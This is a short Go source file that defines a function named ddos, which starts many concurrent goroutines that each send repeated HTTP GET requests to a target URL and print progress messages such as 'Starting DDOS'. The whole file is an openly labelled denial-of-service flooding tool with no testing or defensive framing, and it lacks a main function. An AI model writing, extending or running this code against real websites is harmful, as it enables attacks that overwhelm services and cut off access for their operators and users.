package main

import (
   "net/http"
   "log"
   "fmt"
)

func ddos(url string, countConcurrent int, countRequest int) {
   fmt.Println("------------ Starting DDOS ---------- url : ", url," " ,"Concurrents : ", countConcurrent, " ", "Requests : ", countRequest)
   for i := 1; i <= countConcurrent ; i++ {
      go ManyCallHttpRequest(url, countRequest)
      fmt.Println("count : ", i, " ", "Open Concurrent Process", " ", "url/host : ", url);
   }
}

func ManyCallHttpRequest(url string, countRequest int) {
    for i := 1; i <= countRequest ; i++ {
      CallHttpRequest(url)
    }
}

func CallHttpRequest(url string) {
   _ , err := http.Get(url)
   if err != nil {
      log.Fatalln(err)
   }
}
